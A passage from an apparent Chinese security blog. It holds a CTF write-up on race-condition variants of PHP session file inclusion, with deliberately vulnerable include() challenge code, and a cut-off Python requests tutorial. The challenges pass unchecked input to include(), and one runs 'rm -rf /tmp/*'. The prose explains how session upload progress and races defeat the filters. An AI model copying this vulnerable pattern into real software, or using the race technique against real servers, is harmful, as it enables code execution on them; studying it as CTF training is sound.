      <a data-url="http://traveler2000.github.io/2025/04/25/filter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die%EF%BC%88Web87%EF%BC%89/" data-id="cmag7dmn1000yp0uh40zh4tpn" data-title="filter 伪协议绕过 die（Web87）" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-条件竞争变体题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" class="article-date">
  <time class="dt-published" datetime="2025-04-25T02:00:03.000Z" itemprop="datePublished">2025-04-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/">条件竞争变体题目</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p><code>session_unset()</code>： 清空 <code>$_SESSION</code> 数组（ Session 文件&#x2F;数据存在）。</p>
<p><code>session_destroy()</code> ：删除 Session 文件&#x2F;数据。</p>
<p>然而上面的函数不影响创建新的  Session 文件，且 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 机制不依赖代码中的 <code>session_start()</code>，而是由 PHP 内核在检测到上传进度跟踪时自动处理。</p>
<p>依旧是利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 生成 Session 文件，后面就简单了。</p>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>system(&quot;rm -rf /tmp/*&quot;);</code> 删除所有 Session 文件。但脚本里留了后门，只删除 Session 文件没用。</p>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该题会检查 Session 文件中 <code>&lt;</code> 符号是否存在，存在的话它在不在第一个位置。</p>
<p>如果不存在，<code>false</code> 会被转换为整数 <code>0</code> ，最终 <code>strpos($content, &quot;&lt;&quot;) &gt; 0</code> 这个条件判断结果会是 <code>false</code> ，执行 <code>include($file)</code> ；</p>
<p>如果存在但不在第一个位置，会立即结束当前脚本，反之则会继续执行 <code>include($file)</code> 。</p>
<p>但当大量线程上传文件时，不断重写唯一的 Session 的内容，导致可能有一段时间没有 <code>&lt;</code> 符号，绕过检查；但在文件包含时又写入了 Payload ，导致读取到的文件包含恶意代码。</p>
<h2 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;还要秀？&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**<code>set_include_path</code> **：用于设置 PHP 脚本在使用 <code>include</code>、<code>require</code> 等语句包含文件时的优先搜索路径。</p>
<p>因为是优先，找不到还是要去其他路径找，并没有什么用。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/" data-id="cmag7dmn8002ip0uhhvwu7egg" data-title="条件竞争变体题目" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Session/" rel="tag">Session</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Python-requests" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/24/Python-requests/" class="article-date">
  <time class="dt-published" datetime="2025-04-24T07:04:47.000Z" itemprop="datePublished">2025-04-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/24/Python-requests/">Python-requests</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="requests-库简介"><a href="#requests-库简介" class="headerlink" title="requests 库简介"></a>requests 库简介</h2><p><code>requests</code> 库是 Python 中用于发送 HTTP 请求的常用库，以下通过实例简单介绍一下用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">url = <span class="string">&#x27;https://www.example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 GET 请求</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查响应状态码</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># 打印响应内容</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;响应内容：&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;请求失败，状态码：<span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>requests</code> 库中基于 HTTP 请求方法内置了大量方法，如：</p>
<ul>
<li><code>requests.get(url, params=None, **kwargs)</code>：发送 HTTP GET 请求以从服务器获取资源。</li>
<li><code>requests.post(url, data=None, json=None, **kwargs)</code>：发送 HTTP POST 请求，通常用于向服务器提交数据。</li>
<li><code>requests.put(url, data=None, **kwargs)</code>：发送 HTTP PUT 请求，常用于更新服务器上的资源。</li>
<li><code>requests.delete(url, **kwargs)</code>：发送 HTTP DELETE 请求，用于请求服务器删除指定的资源。</li>
<li><code>requests.head(url, **kwargs)</code>：发送 HTTP HEAD 请求，只返回响应头，不返回响应体。</li>
<li><code>requests.options(url, **kwargs)</code>：发送 HTTP OPTIONS 请求，用于获取服务器支持的请求方法等信息。</li>
<li><code>requests.request(method, url, **kwargs)</code>：通用的请求方法，可根据 <code>method</code> 参数指定的 HTTP 请求方法发送请求。</li>
</ul>
<p>更多方法不再赘述，下面对各方法的参数进行说明：</p>
<h2 id="requests-库各方法的参数与用法"><a href="#requests-库各方法的参数与用法" class="headerlink" title="requests 库各方法的参数与用法"></a>requests 库各方法的参数与用法</h2><h3 id="通用参数（适用于所有HTTP方法）"><a href="#通用参数（适用于所有HTTP方法）" class="headerlink" title="通用参数（适用于所有HTTP方法）"></a>通用参数（适用于所有HTTP方法）</h3><p>所有请求方法（如 <code>get()</code>, <code>post()</code>, <code>put()</code> 等）都支持以下参数：</p>
<ol>
<li><code>url</code> (<strong>必填</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字符串</p>
</li>
<li><p><strong>作用</strong>: 请求的目标URL。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url=&quot;https://api.example.com/data&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><code>params</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典、元组列表或字节</p>
</li>
<li><p><strong>作用</strong>: 将参数拼接到<strong>URL</strong>中，形成查询字符串（query string）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, params=params)</span><br><span class="line"><span class="comment"># 实际请求URL变为：https://api.example.com/data?key1=value1&amp;key2=value2</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><code>headers</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典</p>
</li>
<li><p><strong>作用</strong>: 设置HTTP请求头信息（如User-Agent、Content-Type等）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;my-app/1.0&#x27;</span>, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><code>timeout</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 浮点数或元组</p>
</li>
<li><p><strong>作用</strong>: 设置请求超时时间（秒）。若服务器在指定时间内未响应，抛出 <code>Timeout</code> 异常。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, timeout=<span class="number">5</span>)          <span class="comment"># 连接+读取总超时5秒</span></span><br><span class="line">response = requests.get(url, timeout=(<span class="number">3</span>, <span class="number">10</span>))    <span class="comment"># 连接3秒，读取10秒</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li><code>auth</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 元组或自定义认证类</p>
</li>
<li><p><strong>作用</strong>: 用于HTTP基本认证（如用户名密码）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth = (<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">response = requests.get(url, auth=auth)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="6">
<li><code>cookies</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典或CookieJar对象</p>
</li>
<li><p><strong>作用</strong>: 发送Cookie到服务器。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookies = &#123;<span class="string">&#x27;session_id&#x27;</span>: <span class="string">&#x27;12345abc&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, cookies=cookies)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="7">
<li><code>allow_redirects</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 布尔值</p>
</li>
<li><p><strong>作用</strong>: 是否允许重定向（默认<code>True</code>）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="8">
<li><code>verify</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 布尔值或字符串（证书路径）</p>
</li>
<li><p><strong>作用</strong>: 是否验证SSL证书（默认<code>True</code>）。设为<code>False</code>可跳过验证（不推荐生产环境使用）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)  <span class="comment"># 关闭SSL验证</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="9">
<li><code>proxies</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 字典</p>
</li>
<li><p><strong>作用</strong>: 设置代理服务器。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:3128&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://10.10.1.10:1080&#x27;</span>&#125;</span><br><span class="line">response = requests.get(url, proxies=proxies)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="10">
<li><code>stream</code> (<strong>可选</strong>)</li>
</ol>
<ul>
<li><p><strong>类型</strong>: 布尔值</p>
</li>
<li><p><strong>作用</strong>: 是否以流模式下载（适合大文件，避免立即加载到内存）。</p>
</li>
<li><p><strong>示例</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;large_file.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> response.iter_content(<span class="number">1024</span>):</span><br><span class="line">            f.write(chunk)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="针对不同HTTP方法的参数"><a href="#针对不同HTTP方法的参数" class="headerlink" title="针对不同HTTP方法的参数"></a>针对不同HTTP方法的参数</h3><ol>
<li><strong>GET请求：<code>requests.get()</code></strong></li>
</ol>
<ul>
<li><p>主要用于获取数据，参数通过 <strong><code>params</code></strong> 传递。</p>
</li>
<li><p>示例:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(</span><br><span class="line">    url=<span class="string">&quot;https://example.com/search&quot;</span>,</span><br><span class="line">    params=&#123;<span class="string">&#x27;query&#x27;</span>: <span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;page&#x27;</span>: <span class="number">2</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li><strong>POST请求：<code>requests.post()</code></strong></li>
</ol>
<ul>
<li><p>用于提交数据，常用参数：**<code>data</code>**, <strong><code>json</code></strong>, **<code>files</code>**。</p>
</li>
<li><p><code>data</code> 参数:</p>
<ul>
<li>类型: 字典、元组列表、字符串、字节流</li>
<li>作用: 发送表单数据（<code>application/x-www-form-urlencoded</code> ，默认的表单编码格式，适用于提交简单的文本数据）。</li>
<li>示例:</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;secret&#x27;</span>&#125; <span class="comment"># 字典类型</span></span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = [(<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>), (<span class="string">&#x27;fruit&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>), (<span class="string">&#x27;vegetable&#x27;</span>, <span class="string">&#x27;carrot&#x27;</span>)] <span class="comment"># 元组列表类型，适用于需要处理多个同名字段或对数据顺序有要求的情况。传参到服务端会把同名参数的值以类似 &quot;fruit&quot;:[&quot;apple&quot;,&quot;banana&quot;] 这样的形式存放。</span></span><br><span class="line">data = <span class="string">&#x27;name=Bob&amp;age=30&#x27;</span> <span class="comment"># 用于传输 URL 编码后的字符串</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>json</code> 参数:</p>
<ul>
<li>类型: 字典</li>
<li>作用: 发送JSON数据（自动设置<code>Content-Type: application/json</code>）。</li>
<li>示例:</li>
</ul>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">json_data = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">30</span>&#125;</span><br><span class="line">response = requests.post(url, json=json_data)</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>files</code> 参数:</p>
<ul>
<li>类型: 字典</li>
<li>作用: 上传文件（<code>multipart/form-data</code> ，用于上传文件或包含二进制数据的表单）。</li>
<li>示例:</li>
</ul>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;report.pdf&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li><strong>PUT请求：<code>requests.put()</code></strong></li>
</ol>
<ul>
<li><p>用于更新资源，参数与 <code>post()</code> 相同（<code>data</code>, <code>json</code>, <code>files</code>）。</p>
</li>
<li><p>示例:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.put(url, json=&#123;<span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;New Title&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><strong>DELETE请求：<code>requests.delete()</code></strong></li>
</ol>
<ul>
<li><p>用于删除资源，通常不需要请求体。</p>
</li>
<li><p>示例:</p>
   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.delete(url)</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li><strong>其他方法：<code>head()</code>, <code>options()</code>, <code>patch()</code></strong></li>
</ol>
<ul>
<li>参数与 <code>get()</code> 或 <code>post()</code> 类似，但使用频率较低。</li>
</ul>
<h3 id="高级参数：requests-request"><a href="#高级参数：requests-request" class="headerlink" title="高级参数：requests.request()"></a>高级参数：<code>requests.request()</code></h3><ul>
<li><p>作用: 通用请求方法，可通过 <code>method</code> 参数指定HTTP方法（如<code>GET</code>、<code>POST</code>）。</p>
</li>
<li><p>示例:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.request(method=<span class="string">&#x27;POST&#x27;</span>, url=url, json=data)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="关于-requests-库返回的对象"><a href="#关于-requests-库返回的对象" class="headerlink" title="关于 requests 库返回的对象"></a>关于 requests 库返回的对象</h2><p>在 Python 的 <code>requests</code> 库中，如 <code>response = requests.get(url=url)</code> 返回的是一个 <strong>对象</strong>（属于 <code>requests.models.Response</code> 类）。这个对象包含了 HTTP 请求的所有响应信息，但直接打印 <code>response</code> 并不会显示所有内容，而是会返回一个对象的内存地址表示（例如：<code>&lt;Response [200]&gt;</code>）。</p>
<p>以下是对 <code>response</code> 对象常用属性与方法的介绍：</p>
<h3 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a><strong>常用属性</strong></h3><ol>
<li><strong><code>status_code</code></strong><ul>
<li>HTTP 响应的状态码（如 <code>200</code> 表示成功，<code>404</code> 表示未找到）。</li>
<li>示例：<code>response.status_code</code></li>
</ul>
</li>
<li><strong><code>text</code></strong><ul>
<li>响应内容的字符串形式（自动根据响应编码解码）。</li>
<li>示例：<code>response.text</code></li>
</ul>
</li>
<li><strong><code>content</code></strong><ul>
<li>响应内容的二进制形式（原始字节流）。</li>
<li>示例：<code>response.content</code></li>
</ul>
</li>
<li><strong><code>headers</code></strong><ul>
<li>以字典形式返回响应头（键不区分大小写）。</li>
<li>示例：<code>response.headers[&#39;Content-Type&#39;]</code></li>
</ul>
</li>
<li><strong><code>url</code></strong><ul>
<li>最终请求的 URL（处理重定向后）。</li>
